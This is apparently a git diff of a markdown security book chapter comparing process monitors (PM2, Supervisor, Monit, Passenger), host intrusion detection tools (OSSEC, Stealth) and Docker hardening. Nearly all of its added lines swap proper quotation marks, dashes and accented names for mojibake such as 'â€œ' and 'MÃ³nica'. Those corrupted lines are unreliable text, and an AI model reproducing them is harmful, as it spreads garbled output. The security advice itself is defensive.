 PM2 also seems to [provide logging](https://github.com/Unitech/pm2#log-facilities). My applications provide their [own logging](#web-applications-countermeasures-lack-of-visibility-insufficient-logging) and we have the [systems logging](#vps-countermeasures-lack-of-visibility-logging-and-alerting) which provides aggregates and singular logs, so again I struggle to see what PM2 is offering here that we do not already have.
 
-As mentioned on the [github](https://github.com/Unitech/pm2) README: “_PM2 is a production process manager for Node.js applications with a built-in load balancer_“. This “Sounds” and at the initial glance looks shiny. Very quickly you should realise there are a few security issues you need to be aware of though.
+As mentioned on the [github](https://github.com/Unitech/pm2) README: â€œ_PM2 is a production process manager for Node.js applications with a built-in load balancer_â€œ. This â€œSoundsâ€ and at the initial glance looks shiny. Very quickly you should realise there are a few security issues you need to be aware of though.
 
-The word “production” is used but it requires NPM to install globally. We already have a package manager on Debian and all other main-stream Linux distros. As previously mentioned, installing NPM adds unnecessary attack surface area. Unless it is essential and it should not be, we really do not want another application whos sole purpose is to install additional attack surface in the form of extra packages. NPM contains a huge number of packages, that we really do not want access to on a production server facing the internet. We could install PM2 on a development box and then copy to the production server, but it starts to turn the simplicity of a node module into something not as simple, which then, as does forever, makes offerings like [Supervisor](#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor), [Monit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) and even [Passenger](#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger) look even more attractive.
+The word â€œproductionâ€ is used but it requires NPM to install globally. We already have a package manager on Debian and all other main-stream Linux distros. As previously mentioned, installing NPM adds unnecessary attack surface area. Unless it is essential and it should not be, we really do not want another application whos sole purpose is to install additional attack surface in the form of extra packages. NPM contains a huge number of packages, that we really do not want access to on a production server facing the internet. We could install PM2 on a development box and then copy to the production server, but it starts to turn the simplicity of a node module into something not as simple, which then, as does forever, makes offerings like [Supervisor](#vps-countermeasures-lack-of-visibility-proactive-monitoring-supervisor), [Monit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) and even [Passenger](#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger) look even more attractive.
 
 At the time of writing this, PM2 is about four years old with about 440 open issues on github, most quite old, with 29 open pull requests.
 
@@ -3261,7 +3254,7 @@ If you have considered the above concerns and can justify adding the additional 
 
 **Features that Stand Out**
 
-They are also listed on the github repository. Just beware of some of the caveats. Like for the [load balancing](https://github.com/Unitech/pm2#load-balancing--0s-reload-downtime): “_we recommend the use of node#0.12.0+ or node#0.11.16+. We do not support node#0.10.*'s cluster module anymore_”. 0.11.16 is unstable, but hang-on, I thought PM2 was a “production” process manager? OK, so were happy to mix unstable in with something we label as production?
+They are also listed on the github repository. Just beware of some of the caveats. Like for the [load balancing](https://github.com/Unitech/pm2#load-balancing--0s-reload-downtime): â€œ_we recommend the use of node#0.12.0+ or node#0.11.16+. We do not support node#0.10.*'s cluster module anymore_â€. 0.11.16 is unstable, but hang-on, I thought PM2 was a â€œproductionâ€ process manager? OK, so were happy to mix unstable in with something we label as production?
 
 On top of NodeJS, PM2 will run the following scripts: bash, python, ruby, coffee, php, perl.
 
@@ -3297,7 +3290,7 @@ A> The following are better suited to monitoring and managing your applications.
 
 Supervisor is a process manager with a lot of features and a higher level of abstraction than the likes of the above mentioned [Sysvinit, upstart, systemd, Runit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit), etc, so it still needs to be run by an init daemon in itself.
 
-From the [docs](http://supervisord.org/#supervisor-a-process-control-system): “_It shares some of the same goals of programs like [launchd, daemontools, and runit](http://supervisord.org/glossary.html#term-daemontools). Unlike some of these programs, it is not meant to be run as a substitute for init as “process id 1”. Instead it is meant to be used to control processes related to a project or a customer, and is meant to start like any other program at boot time._” Supervisor monitors the [state](http://supervisord.org/subprocess.html#process-states) of processes. Where as a tool like [Monit](https://mmonit.com/monit/#about) can perform so many more types of tests and take what ever actions you define.
+From the [docs](http://supervisord.org/#supervisor-a-process-control-system): â€œ_It shares some of the same goals of programs like [launchd, daemontools, and runit](http://supervisord.org/glossary.html#term-daemontools). Unlike some of these programs, it is not meant to be run as a substitute for init as â€œprocess id 1â€. Instead it is meant to be used to control processes related to a project or a customer, and is meant to start like any other program at boot time._â€ Supervisor monitors the [state](http://supervisord.org/subprocess.html#process-states) of processes. Where as a tool like [Monit](https://mmonit.com/monit/#about) can perform so many more types of tests and take what ever actions you define.
 
 It is in the Debian [repositories](https://packages.debian.org/stretch/supervisor) and is a trivial install on Debian and derivatives.
 
@@ -3318,7 +3311,7 @@ It is in the Debian [repositories](https://packages.debian.org/stretch/superviso
 3. The person responsible for the application should know if a troganised version of your application is swapped in, or even if your file time-stamps have changed. This is not one of Supervisor's responsibilities.
 4. Ability to add the following later without having to swap the chosen offering:
     1. Reverse proxy: I do not see a problem
-    2. Integrate NodeJS’s core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing. This would be completely separate to supervisor.
+    2. Integrate NodeJSâ€™s core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing. This would be completely separate to supervisor.
     3. Visibility of application statistics could be added later with the likes of Monit or something else. For me, Supervisor does not do enough. Monit does. Plus if you need what Monit offers, then you have to have three packages to think about, or Something like Supervisor, which is not an init system, so it kind of sits in the middle of the ultimate stack. So my way of thinking is, use the init system you already have to do the low level lifting and then something small to take care of everything else on your server that the init system is not really designed for, and Monit does this job really well. Just keep in mind also. This is not based on any bias. I had not used Monit before this exercise. It has been a couple of years since a lot of this was written though and Monit has had a home in my security focussed hosting facility since then. I never look at it or touch it, Monit just lets me know when there are issues and is quiet the rest of the time.
 5. Supervisor is a mature product. It has been around since 2004 and is still actively developed. The official and community provided [docs](https://serversforhackers.com/monitoring-processes-with-supervisord) are good.
 6. Yes it is production ready. It has proven itself.
@@ -3353,7 +3346,7 @@ Monit provides far more visibility into the state of your application and contro
 * Monitoring [space of file-systems](http://slides.com/tildeslash/monit#/24)
 * Has a built-in lightweight HTTP(S) interface you can use to browse the Monit server and check the status of all monitored services. From the web-interface you can start, stop and restart processes and disable or enable monitoring of services. Monit provides [fine grained control](https://mmonit.com/monit/documentation/monit.html#MONIT-HTTPD) over who/what can access the web interface or whether it is even active or not. Again an excellent feature that you can choose to use, or not even have the extra attack surface.
 * There is also an aggregator ([m/monit](https://mmonit.com/)) that allows system administrators to monitor and manage many hosts at a time. Also works well on mobile devices and is available at a one off cost (reasonable price) to monitor all hosts.
-* Once you install Monit you have to actively enable the http daemon in the `monitrc` in order to run the Monit cli and/or access the Monit http web UI. At first I thought “is this broken?” I could not even run `monit status` (a Monit command). ps told me Monit was running. Then I realised… **it is secure by default**. You have to actually think about it in order to expose anything. It was this that confirmed Monit was one of the tools for me.
+* Once you install Monit you have to actively enable the http daemon in the `monitrc` in order to run the Monit cli and/or access the Monit http web UI. At first I thought â€œis this broken?â€ I could not even run `monit status` (a Monit command). ps told me Monit was running. Then I realisedâ€¦ **it is secure by default**. You have to actually think about it in order to expose anything. It was this that confirmed Monit was one of the tools for me.
 * The [Control File](http://mmonit.com/monit/documentation/monit.html#THE-MONIT-CONTROL-FILE)
 * Security by default. Just [like SSH](#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication-ssh-perms), to protect the security of your control file and passwords the control file must have read-write permissions no more than `0700 (`u=xrw,g=,o=`); Monit will complain and exit otherwise, again, security by default.
 
@@ -3375,7 +3368,7 @@ The following was the documentation I used in the same order and I found that th
 3. Monit covers this nicely, you still need to be integrity checking Monit though.
 4. Ability to add the following later without having to swap the chosen offering:
     1. Reverse proxy: Yes, I do not see any issues here
-    2. Integrate NodeJS’s core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing. Monit will still monitor, restart and do what ever else you tell it to do.
+    2. Integrate NodeJSâ€™s core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing. Monit will still monitor, restart and do what ever else you tell it to do.
     3. Monit provides application statistics to look at if that is what you want, but it also goes further and provides directives for you to declare behaviour based on conditions that Monit checks for and can execute.
 5. Plenty of official and community supplied documentation
 6. Yes it is production ready and has been for many years and is still very actively maintained. It is proven itself. Some extra education around some of the [points](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit-features-that-stand-out) I raised above with some of the security features would be good.
@@ -3386,11 +3379,11 @@ There was accepted answer on [Stack Overflow](http://stackoverflow.com/questions
 
 ##### Passenger {#vps-countermeasures-lack-of-visibility-proactive-monitoring-passenger}
 
-I have looked at Passenger before and it looked quite good then. It still does, with one main caveat. It is trying to do to much. One can easily get lost in the official documentation ([example](http://mmonit.com/wiki/Monit/Installation) of the Monit install (handfull of commands to cover all Linux distributions on one page) vs Passenger [install](https://www.phusionpassenger.com/documentation/Users%20guide%20Standalone.html#installation) (many pages to get through)).  “_Passenger is a web server and application server, designed to be fast, robust and lightweight. It runs your web applications with the least amount of hassle by taking care of almost all administrative heavy lifting for you._” I would like to see the actual weight rather than just a relative term “lightweight”. To me it does not look light weight. The feeling I got when evaluating Passenger was similar to the feeling produced with my [Ossec evaluation](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec).
+I have looked at Passenger before and it looked quite good then. It still does, with one main caveat. It is trying to do to much. One can easily get lost in the official documentation ([example](http://mmonit.com/wiki/Monit/Installation) of the Monit install (handfull of commands to cover all Linux distributions on one page) vs Passenger [install](https://www.phusionpassenger.com/documentation/Users%20guide%20Standalone.html#installation) (many pages to get through)).  â€œ_Passenger is a web server and application server, designed to be fast, robust and lightweight. It runs your web applications with the least amount of hassle by taking care of almost all administrative heavy lifting for you._â€ I would like to see the actual weight rather than just a relative term â€œlightweightâ€. To me it does not look light weight. The feeling I got when evaluating Passenger was similar to the feeling produced with my [Ossec evaluation](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec).
 
 The learning curve is quite a bit steeper than all the previous offerings. Passenger has strong opinions that once you buy into could make it hard to use the tools you may want to swap in and out. I am not seeing the [UNIX Philosophy](http://en.wikipedia.org/wiki/Unix_philosophy) here.
 
-If you looked at the Phusion Passenger Philosophy when it was available, seems to have been removed now, you would see some note-worthy comments. “We believe no good software has bad documentation“. If your software is 100% intuitive, the need for documentation should be minimal. Few software products are 100% intuitive, because we only have so much time to develop them. The [comment around](https://github.com/phusion/passenger/wiki/Phusion-Passenger:-Meteor-tutorial#what-passenger-doesnt-do) “the Unix way” is interesting also. At this stage I am not sure this is the Unix way. I would like to spend some time with someone or some team that has Passenger in production in a diverse environment and see how things are working out.
+If you looked at the Phusion Passenger Philosophy when it was available, seems to have been removed now, you would see some note-worthy comments. â€œWe believe no good software has bad documentationâ€œ. If your software is 100% intuitive, the need for documentation should be minimal. Few software products are 100% intuitive, because we only have so much time to develop them. The [comment around](https://github.com/phusion/passenger/wiki/Phusion-Passenger:-Meteor-tutorial#what-passenger-doesnt-do) â€œthe Unix wayâ€ is interesting also. At this stage I am not sure this is the Unix way. I would like to spend some time with someone or some team that has Passenger in production in a diverse environment and see how things are working out.
 
 Passenger is not in the Debian repositories, so you would need to add the apt repository.
 
@@ -3400,12 +3393,12 @@ Passenger is seven years old at the time of writing this, but the NodeJS support
 
 Sadly there were not many that stood out for me.
 
-* The [Handle more traffic](https://www.phusionpassenger.com/handle_more_traffic) marketing material looked similar to [Monit resource testing](http://mmonit.com/monit/documentation/monit.html#RESOURCE-TESTING) but without the detail. If there is something Monit can not do well, it will say “Hay, use this other tool and I will help you configure it to suite the way you want to work. If you do not like it, swap it out for something else” With Passenger it seems to integrate into everything rather than providing tools to communicate loosely. Essentially locking you into a way of doing something that hopefully you like. It also talks about “Uses all available CPU cores“. If you are using Monit you can use the NodeJS cluster module to take care of that. Again leaving the best tool for the job to do what it does best.
+* The [Handle more traffic](https://www.phusionpassenger.com/handle_more_traffic) marketing material looked similar to [Monit resource testing](http://mmonit.com/monit/documentation/monit.html#RESOURCE-TESTING) but without the detail. If there is something Monit can not do well, it will say â€œHay, use this other tool and I will help you configure it to suite the way you want to work. If you do not like it, swap it out for something elseâ€ With Passenger it seems to integrate into everything rather than providing tools to communicate loosely. Essentially locking you into a way of doing something that hopefully you like. It also talks about â€œUses all available CPU coresâ€œ. If you are using Monit you can use the NodeJS cluster module to take care of that. Again leaving the best tool for the job to do what it does best.
 * [Reduce maintenance](https://www.phusionpassenger.com/reduce_maintenance)
-  * “**_Keep your app running, even when it crashes_**. _Phusion Passenger supervises your application processes, restarting them when necessary. That way, your application will keep running, ensuring that your website stays up. Because this is automatic and builtin, you do not have to setup separate supervision systems like Monit, saving you time and effort._” but this is what we want, we want a separate supervision (monitoring) system, or at least a very small monitoring daemon, and this is what Monit excels at, and it is so much easier to set-up than Passenger. This sort of marketing does not sit right with me.
-  * “**_Host multiple apps at once_**. _Host multiple apps on a single server with minimal effort._” If we are talking NodeJS web apps, then they are their own server. They host themselves. In this case it looks like Passenger is trying to solve a problem that does not exist, at least in regards to NodeJS?
+  * â€œ**_Keep your app running, even when it crashes_**. _Phusion Passenger supervises your application processes, restarting them when necessary. That way, your application will keep running, ensuring that your website stays up. Because this is automatic and builtin, you do not have to setup separate supervision systems like Monit, saving you time and effort._â€ but this is what we want, we want a separate supervision (monitoring) system, or at least a very small monitoring daemon, and this is what Monit excels at, and it is so much easier to set-up than Passenger. This sort of marketing does not sit right with me.
+  * â€œ**_Host multiple apps at once_**. _Host multiple apps on a single server with minimal effort._â€ If we are talking NodeJS web apps, then they are their own server. They host themselves. In this case it looks like Passenger is trying to solve a problem that does not exist, at least in regards to NodeJS?
 * [Improve security](https://www.phusionpassenger.com/improve_security)
-  * “**_Privilege separation_**. _If you host multiple apps on the same system, then you can easily run each app as a different Unix user, thereby separating privileges._“. The Monit [documentation](https://mmonit.com/monit/documentation/monit.html#PROGRAM-STATUS-TESTING) says this: “If Monit is run as the super user, you can optionally run the program as a different user and/or group.” and goes on to provide examples how it is done. So again I do not see anything new here. Other than the “Slow client protections” which has side affects, that is it for security considerations with Passenger. Monit has security woven through every aspect of itself.
+  * â€œ**_Privilege separation_**. _If you host multiple apps on the same system, then you can easily run each app as a different Unix user, thereby separating privileges._â€œ. The Monit [documentation](https://mmonit.com/monit/documentation/monit.html#PROGRAM-STATUS-TESTING) says this: â€œIf Monit is run as the super user, you can optionally run the program as a different user and/or group.â€ and goes on to provide examples how it is done. So again I do not see anything new here. Other than the â€œSlow client protectionsâ€ which has side affects, that is it for security considerations with Passenger. Monit has security woven through every aspect of itself.
 * What I saw happening here, was a lot of stuff that as a security focussed proactive monitoring tool, was not required. Your mileage may vary.
 
 **[Offerings](https://www.phusionpassenger.com/download)**
@@ -3512,7 +3505,7 @@ Right. So what happens when Monit dies..?...
 
 Now you are going to want to make sure your monitoring tool that can be configured to take all sorts of actions never just stops running, leaving you flying blind. No noise from your servers means all good right? Not necessarily. Your monitoring tool just has to keep running, no ifs or buts about it. So let us make sure of that now.
 
-When Monit is `apt-get install`‘ed on Debian, it gets installed and configured to run as a daemon. This is defined in Monits init script.  
+When Monit is `apt-get install`â€˜ed on Debian, it gets installed and configured to run as a daemon. This is defined in Monits init script.  
 Monits init script is copied to `/etc/init.d/` and the run levels set-up for it upon installation. This means when ever a run level is entered the init script will be run taking either the single argument of `stop` (example: `/etc/rc0.d/K01monit`), or `start` (example: `/etc/rc2.d/S17monit`). Remember we [discussed run levels](#vps-countermeasures-disable-remove-services-harden-what-is-left-disable-exim) previously?
 
 **systemd to the rescue**
@@ -3553,7 +3546,7 @@ I found a template that Monit had already provided for a unit file in
     WantedBy=multi-user.target
 
 Now, some explanation. Most of this is pretty obvious. The `After=` directive just tells systemd to make sure the `network.target` file has been acted on first and of course `network.target` has `After=network-pre.target` which does not have a lot in it. I am not going to go into this now, as I do not really care too much about it. It works. It means the network interfaces have to be up first. If you want to know how, why, check the [systemd NetworkTarget documentation](https://www.freedesktop.org/wiki/Software/systemd/NetworkTarget/). `Type=simple`. Again check the systemd.service man page.
-Now to have systemd control Monit, Monit must not run as a background process (the default). To do this, we can either add the `set init` statement to Monit’s control file or add the `-I` option when running systemd, which is exactly what we have done above. The `WantedBy=` is the target that this specific unit is part of.
+Now to have systemd control Monit, Monit must not run as a background process (the default). To do this, we can either add the `set init` statement to Monitâ€™s control file or add the `-I` option when running systemd, which is exactly what we have done above. The `WantedBy=` is the target that this specific unit is part of.
 
 Now we need to tell systemd to create the symlinks in the `/etc/systemd/system/multi-user.target.wants` directory and other things. See the [systemctl man page](http://www.dsm.fordham.edu/cgi-bin/man-cgi.pl?topic=systemctl) for more details about what enable actually does if you want them. You will also need to start the unit.
 
@@ -3565,7 +3558,7 @@ Now what I like to do here is:
 Then compare this output once we enable the service:
 
 {linenos=off, lang=bash}
-    ● monit.service - Pro-active monitoring utility for unix systems
+    â— monit.service - Pro-active monitoring utility for unix systems
        Loaded: loaded (/etc/systemd/system/monit.service; disabled)
        Active: inactive (dead)
 
@@ -3580,7 +3573,7 @@ systemd now knows about monit.service
 Outputs:
 
 {linenos=off, lang=bash}
-    ● monit.service - Pro-active monitoring utility for unix systems
+    â— monit.service - Pro-active monitoring utility for unix systems
        Loaded: loaded (/etc/systemd/system/monit.service; enabled)
        Active: inactive (dead)
 
@@ -3892,7 +3885,7 @@ There is Lots of documentation. It is not always the easiest to navigate because
 * Several good looking books
   1. Book one ([Instant OSSEC Host-based Intrusion Detection System](https://www.amazon.com/Instant-Host-based-Intrusion-Detection-System/dp/1782167641/))
   2. Book two ([OSSEC Host-Based Intrusion Detection Guide](https://www.amazon.com/OSSEC-Host-Based-Intrusion-Detection-Guide/dp/159749240X))
-  3. Book three ([OSSEC How-To – The Quick And Dirty Way](https://blog.savoirfairelinux.com/en/tutorials/free-ebook-ossec-how-to-the-quick-and-dirty-way/))
+  3. Book three ([OSSEC How-To â€“ The Quick And Dirty Way](https://blog.savoirfairelinux.com/en/tutorials/free-ebook-ossec-how-to-the-quick-and-dirty-way/))
 * [Commercial Support](https://ossec.github.io/blog/posts/2014-05-12-OSSEC-Commercial-Support-Contracts.markdown.html)
 * [FAQ](https://ossec-docs.readthedocs.io/en/latest/faq/index.html)
 * [Package meta-data](http://ossec.alienvault.com/repos/apt/debian/dists/jessie/main/binary-amd64/Packages)
@@ -3927,7 +3920,7 @@ Agents can be installed on VMware ESX but from what I have read it is quite a bi
 
 To me, the ability to scan in real-time off-sets the fact that the agents in most cases have binaries installed. This hinders the attacker from [covering their tracks](#vps-identify-risks-lack-of-visibility).
 
-Can be configured to scan systems in [real](https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#realtime-options)–[time](https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#real-time-monitoring) based on [inotify](https://en.wikipedia.org/wiki/Inotify) events.
+Can be configured to scan systems in [real](https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#realtime-options)â€“[time](https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#real-time-monitoring) based on [inotify](https://en.wikipedia.org/wiki/Inotify) events.
 
 Backed by a large company Trend Micro.
 
@@ -3957,7 +3950,7 @@ You can find the source on [github](https://github.com/fbb-git/stealth)
 
 **Who is Behind Stealth?**
 
-Author: Frank B. Brokken. An admirable job for one person. Frank is not a fly-by-nighter though. Stealth was first presented to Congress in 2003. It is still actively maintained and used by a few. It is one of GNU/Linux’s dirty little secrets I think. It is a great idea implemented, makes a tricky job simple and does it in an elegant way.
+Author: Frank B. Brokken. An admirable job for one person. Frank is not a fly-by-nighter though. Stealth was first presented to Congress in 2003. It is still actively maintained and used by a few. It is one of GNU/Linuxâ€™s dirty little secrets I think. It is a great idea implemented, makes a tricky job simple and does it in an elegant way.
 
 **[Documentation](https://fbb-git.github.io/stealth/)**
 
@@ -4010,7 +4003,7 @@ The Monitor stores one to many policy files. Each of which is specific to a sing
 
 File integrity tests leaving virtually no sediments on the tested client.
 
-Stealth subscribes to the “dark cockpit” approach. I.E. no mail is sent when no changes are detected. If you have a MTA, Stealth can be configured to send emails on changes it finds.
+Stealth subscribes to the â€œdark cockpitâ€ approach. I.E. no mail is sent when no changes are detected. If you have a MTA, Stealth can be configured to send emails on changes it finds.
 
 {#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth-what-i-like}
 **What I like**
@@ -4019,9 +4012,9 @@ Stealth subscribes to the “dark cockpit” approach. I.E. no mail is sent when
 * Rather than just modifying the likes of `sha1sum` on the clients that Stealth uses to perform its integrity checks, Stealth would somehow have to be fooled into thinking that the changed hash of the `sha1sum` it has just copied to the Monitor is the same as the previously recorded hash that it did the same with. If the previously recorded hash is removed or does not match the current hash, then Stealth will fire an alert off.
 * It is in the Debian repositories
 * The whole idea behind it. Systems being monitored give little appearance that they are being monitored, other than I think the presence of a single SSH login when Stealth first starts in the `auth.log`. This could actually be months ago, as the connection remains active for the life of Stealth. The login could be from a user doing anything on the client. It is very discrete.
-* Unpredictability of Stealth runs is offered through Stealth’s `--random-interval` and `--repeat` options. E.g. `--repeat 60 --random-interval 30` results in new Stealth-runs on average every 75 seconds. It can usually take a couple of minutes to check all the important files on a file system, so you would probably want to make the checks several minutes apart from each other.
-* Subscribes to the Unix philosophy: “do one thing and do it well”
-* Stealth’s author is very approachable and open. After talking with Frank and suggesting some ideas to promote Stealth and its community, Frank started a [discussion list](http://sourceforge.net/p/stealth/discussion/). Now that Stealth is moved to github, issues can be submitted easily. If you use Stealth and have any trouble, Frank is very easy to work with.
+* Unpredictability of Stealth runs is offered through Stealthâ€™s `--random-interval` and `--repeat` options. E.g. `--repeat 60 --random-interval 30` results in new Stealth-runs on average every 75 seconds. It can usually take a couple of minutes to check all the important files on a file system, so you would probably want to make the checks several minutes apart from each other.
+* Subscribes to the Unix philosophy: â€œdo one thing and do it wellâ€
+* Stealthâ€™s author is very approachable and open. After talking with Frank and suggesting some ideas to promote Stealth and its community, Frank started a [discussion list](http://sourceforge.net/p/stealth/discussion/). Now that Stealth is moved to github, issues can be submitted easily. If you use Stealth and have any trouble, Frank is very easy to work with.
 
 **What I like less**
 
@@ -4077,7 +4070,7 @@ As mentioned above, providing you have a working MTA, then Stealth will just do 
 
 It is my intention to provide a high level over view of the concepts you will need to know in order to establish a somewhat secure environment around the core Docker components and your containers. There are many resources available, and the Docker security team is hard at work constantly trying to make the task of improving security around Docker easier.
 
-Do not forget to check the [Additional Resources](#additional-resources-vps-countermeasures-docker) section for material to be consumed in parallel with the Docker Countermeasures, such as the excellent CIS Docker Benchmark and an [interview](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) of the Docker Security Team Lead I carried out with Diogo Mónica.
+Do not forget to check the [Additional Resources](#additional-resources-vps-countermeasures-docker) section for material to be consumed in parallel with the Docker Countermeasures, such as the excellent CIS Docker Benchmark and an [interview](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) of the Docker Security Team Lead I carried out with Diogo MÃ³nica.
 
 Cisecurity has an [excellent resource](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf) for hardening docker images which the Docker Security team helped with.
 
@@ -4086,7 +4079,7 @@ Cisecurity has an [excellent resource](https://benchmarks.cisecurity.org/tools2/
 
 "_Docker Security Scanning is available as an add-on to Docker hosted private repositories on both Docker Cloud and Docker Hub._", you also have to [opt in](https://docs.docker.com/docker-cloud/builds/image-scan/#/opt-in-to-docker-security-scanning) and pay for it. Docker Security Scanning is also now available on the new [Enterprise Edition](https://blog.docker.com/2017/03/docker-enterprise-edition/). The scan compares the SHA of each component in the image with those in an up to date CVE database for known vulnerabilities. This is a good start, but not free and does not do enough. Images are scanned on push and the results indexed so that when new CVE databases are available, comparisons can continue to be made.
 
-It’s up to the person consuming images from docker hub to assess whether or not they have vulnerabilities in them. Whether un-official or [official](https://github.com/docker-library/official-images), it is your responsibility. Check the [Hardening Docker Host, Engine and Containers](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers) section for tooling to assist with finding vulnerabilities in your Docker hosts and images.
+Itâ€™s up to the person consuming images from docker hub to assess whether or not they have vulnerabilities in them. Whether un-official or [official](https://github.com/docker-library/official-images), it is your responsibility. Check the [Hardening Docker Host, Engine and Containers](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers) section for tooling to assist with finding vulnerabilities in your Docker hosts and images.
 
 Your priority before you start testing images for vulnerable contents, is to understand the following:
 
@@ -4098,7 +4091,7 @@ Your priority before you start testing images for vulnerable contents, is to und
     Layers are now identified by a digest which looks like:
     `sha256:<the-hash>`  
     The above hash element is created by applying the SHA256 hashing algorithm to the layers content.  
-    The image ID is also the hash of the configuration object which contains the hashes of all the layers that make up the images copy-on-write filesystem definition, also discussed in my [Software Engineering Radio show](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) with Diogo Mónica.
+    The image ID is also the hash of the configuration object which contains the hashes of all the layers that make up the images copy-on-write filesystem definition, also discussed in my [Software Engineering Radio show](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) with Diogo MÃ³nica.
     2. Integrity: How do you know that your image has not been tampered with?  
     This is where secure signing comes in with the [Docker Content Trust](https://blog.docker.com/2015/08/content-trust-docker-1-8/) feature. Docker Content Trust is enabled through an integration of [Notary](https://github.com/docker/notary) into the Docker Engine. Both the Docker image producing party and image consuming party need to opt-in to use Docker Content Trust. By default, it is disabled. In order to do that, Notary must be downloaded and setup by both parties, and the `DOCKER_CONTENT_TRUST` environment variable [must be set](https://docs.docker.com/engine/security/trust/content_trust/#/enable-and-disable-content-trust-per-shell-or-per-invocation) to `1`, and the `DOCKER_CONTENT_TRUST_SERVER` must be [set to the URL](https://docs.docker.com/engine/reference/commandline/cli/#environment-variables) of the Notary server you setup.  
     
@@ -4228,7 +4221,7 @@ With reapplication of the ownership and permissions of the non-root user, as the
     11 drwxr-xr-x 34 root            root            4.0K Sep 13 08:51 ..
     13 drwxr-x--- 21 nodegoat_docker nodegoat_docker 4.0K Sep 13 08:51 app
 
-An alternative to setting the non-root user in the `Dockerfile`, is to set it in the `docker-compose.yml`, providing the non-root user has been added to the image in the `Dockerfile`. In the case of NodeGoat, the mongo `Dockerfile` is maintained by DockerHub, and it adds a user called `mongodb`. Then in the NodeGoat projects `docker-compose.yml`, we just need to set the user, as seen on line 13 below:
+An alternative to setting the non-root user in the `Dockerfile` is to set it in the `docker-compose.yml`, provided that the non-root user has been added to the image in the `Dockerfile`. In the case of NodeGoat, the mongo `Dockerfile` is maintained by DockerHub, and it adds a user called `mongodb`. In the NodeGoat projects `docker-compose.yml`, we just need to set the user, as seen on line 13 below:
 
 {title="NodeGoat docker-compose.yml", linenos=on}
     version: "2.0"
@@ -4314,7 +4307,7 @@ Features of Runtime:
 ##### Possible contenders to watch
 
 * [Drydock](https://github.com/zuBux/drydock) is a similar offering to Docker Bench, but not as mature at this stage
-* [Actuary](https://github.com/diogomonica/actuary) is a similar offering to Docker Bench, but not as mature at this stage. I [discussed](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) this project briefly with its creator Diogo Mónica, and it sounds like the focus is on creating a better way of running privileged services on swarm, instead of investing time into this.
+* [Actuary](https://github.com/diogomonica/actuary) is a similar offering to Docker Bench, but not as mature at this stage. I [discussed](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) this project briefly with its creator Diogo MÃ³nica, and it sounds like the focus is on creating a better way of running privileged services on swarm, instead of investing time into this.
 
 ##### Namespaces {#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-namespaces}
 
@@ -4925,7 +4918,7 @@ Yes container security is important, but in most cases, it is not the lowest han
 
 Application security is still the weakest point for compromise. It is usually much easier to attack an application running in a container or anywhere for that matter than it is to break container isolation or any security offered by containers or their infrastructure. Once an attacker has exploited any one of the commonly exploited vulnerabilities (such as any of the OWASP Top 10 for starters) still being introduced and found in our applications on a daily basis, and subsequently performed a remote code execution for example, and ex-filled the database, no amount of container security is going to mitigate this.   
 
-During and before my [interview](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) of Diogo Mónica on Docker Security for the Software Engineering Radio show, we discussed Isolation concepts, many of which I have covered above. Diogo mentioned: "why does isolation even matter when an attacker already has access to your internal network?" There are very few attacks that require escaping from a container or VM in order to succeed, there are just so many easier approaches to compromise. Yes, this may be an issue for the cloud providers that are hosting containers and VMs, but for most businesses, the most common attack vectors are still attacks focussing on our weakest areas, such as people, password stealing, spear phishing, uploading and execution of web shells, compromising social media accounts, weaponised documents, and ultimately application security, as I have [mentioned many times](https://blog.binarymist.net/presentations-publications/#nzjs-2017-the-art-of-exploitation) before.
+During and before my [interview](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) of Diogo MÃ³nica on Docker Security for the Software Engineering Radio show, we discussed Isolation concepts, many of which I have covered above. Diogo mentioned: "why does isolation even matter when an attacker already has access to your internal network?" There are very few attacks that require escaping from a container or VM in order to succeed, there are just so many easier approaches to compromise. Yes, this may be an issue for the cloud providers that are hosting containers and VMs, but for most businesses, the most common attack vectors are still attacks focussing on our weakest areas, such as people, password stealing, spear phishing, uploading and execution of web shells, compromising social media accounts, weaponised documents, and ultimately application security, as I have [mentioned many times](https://blog.binarymist.net/presentations-publications/#nzjs-2017-the-art-of-exploitation) before.
 
 Diogo and myself also had a [discussion](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) about the number of container vs VM vulnerabilities, and it is pretty clear that there are far more vulnerabilities [affecting VMs](https://xenbits.xen.org/xsa/) than there are [affecting containers](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=docker).
 
@@ -4991,8 +4984,8 @@ The following is a final type of check-list that I like to use before opening a 
